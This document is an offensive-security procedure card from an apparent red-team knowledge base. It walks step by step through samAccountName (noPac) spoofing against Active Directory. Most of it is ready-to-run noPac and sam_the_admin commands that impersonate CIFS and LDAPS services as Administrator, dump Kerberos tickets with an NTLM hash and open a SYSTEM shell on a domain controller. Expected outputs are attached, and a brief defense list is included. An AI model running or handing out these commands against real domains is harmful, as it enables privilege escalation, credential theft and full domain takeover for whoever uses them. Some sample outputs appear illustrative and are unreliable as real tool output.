---
id: 8d165194-4c12-49f6-8558-563a2352bb80
name: Sam-Account-Name-Spoofing-for-User-Impersonation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:03.201802+00:00'
updated_at: '2023-04-10T20:36:11.677012+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
  - '[[techniques/Pass the Hash|T1075 - Pass the Hash]]'
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/From CVE to SYSTEM shell on DC]]'
  - '[[tags/samAccountName spoofing]]'
commands:
  - '[[commands/scan-domain-users-with-nopac]]'
  - '[[commands/perform-cifs-impersonation-with-nopac]]'
  - '[[commands/perform-ldaps-impersonation-with-nopac-as-admin]]'
  - '[[commands/dump-nopac-credentials-with-python-nopac]]'
  - '[[commands/impersonate-domain-admin-with-sam-the-admin]]'
platforms:
  - Windows
tools:
  - '[[tools/nopac]]'
  - '[[tools/sam-the-admin]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Sam-Account-Name-Spoofing-for-User-Impersonation

## Summary

This procedure demonstrates how to perform a samAccountName spoofing attack in an Active Directory environment to impersonate legitimate users, including domain administrators, by exploiting Kerberos authentication weaknesses and machine account quotas. It involves scanning for vulnerabilities, dumping credentials using noPAC techniques, and creating spoofed machine accounts to escalate privileges and gain remote access.

## Description

The samAccountName spoofing attack leverages a flaw in Active Directory where multiple objects can share the same samAccountName but have different userPrincipalNames (UPNs), allowing impersonation during Kerberos authentication. An attacker with initial low-privilege domain access can use tools like noPac to identify exploitable accounts and perform delegation attacks, or scripts like sam_the_admin to create temporary machine accounts that spoof critical names (e.g., matching a domain controller) to obtain replication rights. This enables credential dumping, pass-the-hash/ticket attacks, and lateral movement to high-privilege systems like domain controllers. The technique is effective in environments with unconstrained delegation or high machine account quotas (default 10). Target environments include Windows Server Active Directory domains with domain user credentials. Expected outcomes include impersonation of service accounts or domain admins, leading to SYSTEM-level shells on domain controllers.

## Requirements

1. Domain user credentials with ability to create machine accounts (ms-DS-MachineAccountQuota >=1, default 10).
2. Network access to domain controller (ports 88, 389/636 LDAP, 445 SMB).
3. Tools: noPac.exe or noPac.py, sam_the_admin.py installed on attacker machine (Kali Linux or Windows with Impacket).
4. Knowledge of target domain name, DC IP/hostname, and target user accounts.

## Defense

- Implement unconstrained delegation restrictions and monitor for anomalous Kerberos ticket requests (Event ID 4769).
- Reduce ms-DS-MachineAccountQuota to 0 and audit machine account creations (Event ID 5136).
- Enable Protected Users group for high-privilege accounts to prevent delegation.
- Monitor for unusual LDAP/SMB connections and credential dumps using tools like Microsoft ATA or SIEM rules for noPAC patterns.

## Objectives

1. Enumerate domain users and identify spoofing opportunities to impersonate legitimate accounts.
2. Dump credentials or perform pass-the-ticket to access remote services.
3. Escalate to domain admin privileges via machine account spoofing for full domain compromise.
4. Achieve persistent access to sensitive systems like domain controllers.

## Instructions

### Step 1: Scan Domain for Vulnerable Users

**Context**: Begin by scanning the domain to enumerate users and identify potential targets for spoofing, using authenticated access to query Active Directory.

**Command** ([[commands/scan-domain-users-with-nopac]]):
```bash
noPac.exe scan -domain htb.local -user user -pass 'password123'
```

> This command authenticates to the domain and scans for users with SPNs or delegation rights exploitable via noPAC. It helps identify service accounts or admins for impersonation. If successful, it lists users without triggering alerts.

**Expected Output**: A list of domain users, including those with Kerberos tickets or delegation enabled, such as "Found users: user1, admin1".

### Step 2: Perform CIFS Impersonation for Credential Access

**Context**: Use the enumerated credentials to spoof a machine account and impersonate via CIFS (SMB) service, enabling pass-the-ticket to access file shares or remote execution.

**Command** ([[commands/perform-cifs-impersonation-with-nopac]]):
```bash
noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt
```

> This spoofs the samAccountName to impersonate the target machine account over SMB/CIFS, applying the ticket locally for lateral movement. The /ptt flag enables pass-the-ticket functionality.

**Expected Output**: Successful ticket application message, e.g., "Ticket applied successfully. Access granted to CIFS service."

### Step 3: Perform LDAPS Impersonation for Privilege Escalation

**Context**: Escalate by impersonating a high-privilege account (e.g., Administrator) over LDAPS, allowing LDAP queries or modifications as the spoofed user.

**Command** ([[commands/perform-ldaps-impersonation-with-nopac-as-admin]]):
```bash
noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator
```

> This targets the LDAPS service (port 636) for secure impersonation, using the /impersonate flag to assume the Administrator role. It builds on prior steps to achieve elevated LDAP access.

**Expected Output**: Impersonation confirmation, e.g., "Impersonating Administrator on LDAPS. Ticket saved."

### Step 4: Dump noPAC Credentials Using Python Tool

**Context**: If hashes are available, dump noPAC data (Kerberos tickets without PAC) from the DC using LDAP, extracting credentials for offline cracking or direct use.

**Command** ([[commands/dump-nopac-credentials-with-python-nopac]]):
```bash
python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump
```

> Authenticate with NTLM hash via Impacket's noPac.py to query and dump tickets. The -use-ldap ensures secure communication; -dump outputs credentials in crackable format.

**Expected Output**: Dumped tickets or hashes, e.g., "Dumped TGT for user: $krb5tgs$..."

### Step 5: Impersonate Domain Admin with Machine Account Spoofing

**Context**: Create a temporary machine account spoofing a DC name to gain replication rights, then impersonate a domain admin for shell access.

**Command** ([[commands/impersonate-domain-admin-with-sam-the-admin]]):
```bash
python3 sam_the_admin.py "domain/user:password" -dc-ip 10.10.10.10 -shell
```

> This script adds a machine account (e.g., SAMTHEADMIN-11$), sets its samAccountName to match a DC for auth bypass, requests S4U2self tickets, and launches a shell as the impersonated admin (e.g., gaylene.dreddy). It cleans up afterward.

**Expected Output**: Script logs showing account creation, ticket saving, and shell prompt, e.g., "Impersonating gaylene.dreddy... C:\Windows\system32>whoami nt authority\system".
